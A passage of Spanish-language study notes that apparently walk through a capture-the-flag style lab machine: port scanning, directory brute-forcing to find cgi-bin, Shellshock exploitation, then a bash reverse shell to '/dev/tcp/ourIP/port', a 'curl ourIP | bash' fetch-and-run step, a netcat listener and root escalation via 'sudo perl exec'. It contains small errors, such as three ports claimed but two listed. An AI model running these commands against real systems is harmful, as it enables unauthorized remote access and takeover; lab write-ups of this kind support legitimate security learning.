Haciendo un reconocimiento con [[Nmap]], veremos que encontramos 3 puertos abiertos: el 80 y el 2222. Por lo general, usaremos el puerto 80.

Para obtener información del servidor (abierto en el puerto 80), usamos el comando `what web`:

> `whatweb ipMachine`

Para ver a cuáles directorios podemos acceder desde esta web, usaremos la aplicación **[[Dirbuster]]**:

1. Insertamos la URL (http://ip:port).

2. Ponemos 50 hilos.

3. En "FIle with the list of dirs/files", buscamos con "browse" y elegimos el siguiente path: "/usr/share/wordlists/dirbuster/**medium**" (casi siempre escogeremos el medium), y le damos a Start.
 
4. En esta máquina, encontramos el directorio "cgi-bin"... Si investigamos sobre este directorio, veremos que es una vulnerabilidad que podemos explotar, y que dentro de este encontramos archivos binarios.
 
5. Si hacemos otra búsqueda con [[Dirbuster]], pero lo configuramos para que empiece por "/cgi-bin" y que busque archivos "sh, py", nos dará los archivos binarios que podremos ejecutar ([[reverse shell]]).
 
6. Ahora que sabemos que podemos hacer reverse shell, buscamos en github el repositorio de "[[shellshock]]" y buscamos la línea que nos permita entrar en el sistema.
 
7.  Con la línea de código en la terminal, cambiamos primero la parte de la ip y la del nombre del archivo binario ejecutable.
 
8. En lo de "/bin/bash" podremos ejecutar el comando siguiente que nos salga a esto, podemos poner un whoami y ver lo que ocurre... ¡Funciona! Pues vamos a conseguir entrar:
 
9. Creamos un archivo llamado "[[index.html]]" (por ejemplo), y escribimos lo siguiente de código:

> `#!/bin/bash`
> [[bash -i >& /dev/tcp/ourIP/port 0>&1]]

10. Nos abrimos un servidor web con python en el sitio en el que tengamos este archivo.

11. Nos ponemos en escucha en el puerto en el que hemos puesto en el "[[index.html]]":

> [[sudo nc -nlvp port]]

12. En el código ejecutable, cambiaremos el código ejecutable por el siguiente:

> [[curl ourIP | bash]]

13. Ya estamos dentro, pero ahora nos falta escalar privilegios:

Usamos el comando `sudo -l`

Hacemos `sudo /usr/bin/perl -e 'exec "/bin"bash'`

Ahora `script /dev/null -c bash`
>[[script /dev/null -c bash]]



